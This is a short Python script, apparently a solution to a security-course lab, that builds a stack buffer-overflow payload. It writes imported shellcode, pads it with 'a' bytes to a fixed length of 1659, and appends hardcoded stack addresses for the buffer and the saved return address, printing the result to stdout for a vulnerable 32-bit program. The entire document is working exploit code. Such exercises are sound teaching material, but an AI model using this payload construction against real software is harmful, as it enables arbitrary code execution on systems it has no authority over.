import sys
from shellcode import shellcode

# address of the return address
ret_addr_addr = b"\x8c\xb1\xf6\xbf"

# address of buf
shellcode_addr = b"\xfd\xaa\xf6\xbf"

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a" * (1659 - len(shellcode)))
sys.stdout.buffer.write(shellcode_addr)
sys.stdout.buffer.write(ret_addr_addr)
